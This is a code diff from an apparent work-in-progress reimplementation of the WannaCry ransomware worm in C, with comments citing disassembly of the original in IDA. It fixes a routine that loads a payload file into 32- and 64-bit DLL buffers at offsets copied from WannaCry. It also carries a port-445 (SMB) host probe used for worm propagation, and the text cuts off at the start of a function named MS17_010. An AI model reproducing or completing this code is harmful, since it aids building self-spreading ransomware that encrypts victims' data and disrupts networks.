@@ -1,26 +1,30 @@
+#include <windows.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <iphlpapi.h>
+#pragma comment(lib, "Ws2_32.lib")
+#pragma comment(lib, "iphlpapi.lib")
+
 //https://blog.malwarebytes.com/threat-analysis/2017/05/the-worm-that-spreads-wanacrypt0r/
 //skeleton code at this moment
 //still a work in progress
 //EXE file global here
 volatile HGLOBAL hDLL_x86;
 volatile HGLOBAL hDLL_x64;
-
+HGLOBAL hMemory_x86, hMemory_x64;
 //init the DLL payload here
 //read from Wannacry in IDA
 //also here: https://www.acronis.com/en-us/blog/posts/wannacry-attack-what-it-and-how-protect-your-computer
 //Memory alloc functions: https://www.tenouk.com/visualcplusmfc/visualcplusmfc20.html
-HGLOBAL initialize_payload() {
-    /*
-    32-bit dll start address 0x40B020, size is 0x4060 bytes
-    64-bit dll start address 0x40F080, size is 0xc8a4 bytes
-    */
+HGLOBAL initialize_payload(const char* Filename) {
+    //32-bit dll start address 0x40B020, size is 0x4060 bytes
+    //64-bit dll start address 0x40F080, size is 0xc8a4 bytes
     DWORD NumberOfBytesRead;
     DWORD fileSize;
     //size = 0x4060 converted to decimal: 16480
-    //Possibly -> GlobalAlloc(GPTR, 5298176)
+    //Possibly->GlobalAlloc(GPTR, 5298176)
     hDLL_x86 = GlobalAlloc(GMEM_ZEROINIT, 5298176);
-    /* 0x50D000 found in IDA but most likely: 0x506000 for 32 bit */
-
+    //0x50D000 found in IDA but most likely: 0x506000 for 32 bit
     //size = 0xc8a4 converted to decimal: 51364
     //Possibly -> GlobalAlloc(GPTR, 5298176)
     hDLL_x64 = GlobalAlloc(GMEM_ZEROINIT, 5298176); //0x50D000 found in IDA
@@ -31,10 +35,10 @@ HGLOBAL initialize_payload() {
         HANDLE fileHandle = CreateFileA(Filename, 0x80000000, 1, NULL, 3, 4, NULL);
         if (fileHandle != INVALID_HANDLE_VALUE) {
             fileSize = GetFileSize(fileHandle, NULL);
-            *(DWORD*)hDLL_x86 + 0x4060 = fileSize; //Dword length written in x86 DLL buffer
-            *(DWORD*)hDLL_x64 + 0xc8a4 = fileSize; //Dword length written in x64 DLL buffer
-            ReadFile(fileHandle, hDLL_x86 + 0x4060 + sizeof(DWORD), &fileSize, &NumberOfBytesRead, 0);
-            ReadFile(fileHandle, hDLL_x64 + 0xc8a4 + sizeof(DWORD), &fileSize, &NumberOfBytesRead, 0);
+            *((DWORD*)hDLL_x86 + 0x4060) = fileSize; //Dword length written in x86 DLL buffer
+            *((DWORD*)hDLL_x64 + 0xc8a4) = fileSize; //Dword length written in x64 DLL buffer
+            ReadFile(fileHandle, (LPBYTE)hDLL_x86 + 0x4060 + sizeof(DWORD), fileSize, &NumberOfBytesRead, 0);
+            ReadFile(fileHandle, (LPBYTE)hDLL_x64 + 0xc8a4 + sizeof(DWORD), fileSize, &NumberOfBytesRead, 0);
             CloseHandle(fileHandle);
         }
     } else {
@@ -46,43 +50,43 @@ HGLOBAL initialize_payload() {
 // This function checks if a connection can be established on port 445 of the specified IP address
 // Returns 1 if connection can be established, 0 otherwise
 int canConnectToPort445(const char* ip) {
-	// Create and initialize sockaddr_in struct with IP address and port number
-	struct sockaddr_in name;
-	name.sin_family = AF_INET;
-	name.sin_addr.s_addr = inet_addr(ip);
-	name.sin_port = htons(445);
+    // Create and initialize sockaddr_in struct with IP address and port number
+    struct sockaddr_in name;
+    name.sin_family = AF_INET;
+    name.sin_addr.s_addr = inet_addr(ip);
+    name.sin_port = htons(445);
 
-	// Create a TCP socket to attempt connection on
-	SOCKET control_sock;
-	if ((control_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {
-		// Return 0 if socket creation fails
-		return 0;
-	}
+    // Create a TCP socket to attempt connection on
+    SOCKET control_sock;
+    if ((control_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {
+        // Return 0 if socket creation fails
+        return 0;
+    }
 
-	// Set socket to non-blocking mode
-	u_long argp;
-	ioctlsocket(control_sock, FIONBIO, &argp);
+    // Set socket to non-blocking mode
+    u_long argp;
+    ioctlsocket(control_sock, FIONBIO, &argp);
 
-	// Initialize a set of write file descriptors to check if socket is writable
-	fd_set writefds;
-	FD_ZERO(&writefds);
-	FD_SET(control_sock, &writefds);
+    // Initialize a set of write file descriptors to check if socket is writable
+    fd_set writefds;
+    FD_ZERO(&writefds);
+    FD_SET(control_sock, &writefds);
 
-	// Set timeout value for select() function
-	struct timeval timeout;
-	timeout.tv_sec = 1;
-	timeout.tv_usec = 0;
+    // Set timeout value for select() function
+    struct timeval timeout;
+    timeout.tv_sec = 1;
+    timeout.tv_usec = 0;
 
-	// Attempt connection to specified IP address and port
-	if (connect(control_sock, (struct sockaddr*)&name, sizeof(name)) == -1) {
-		// Connection failed, return 0
-		closesocket(control_sock);
-		return 0;
-	}
+    // Attempt connection to specified IP address and port
+    if (connect(control_sock, (struct sockaddr*)&name, sizeof(name)) == -1) {
+        // Connection failed, return 0
+        closesocket(control_sock);
+        return 0;
+    }
 
-	// Connection successful, close socket and return result of select() function
-	closesocket(control_sock);
-	return select(0, NULL, &writefds, NULL, &timeout);
+    // Connection successful, close socket and return result of select() function
+    closesocket(control_sock);
+    return select(0, NULL, &writefds, NULL, &timeout);
 }
 
 DWORD MS17_010(DWORD LPPARAM) {
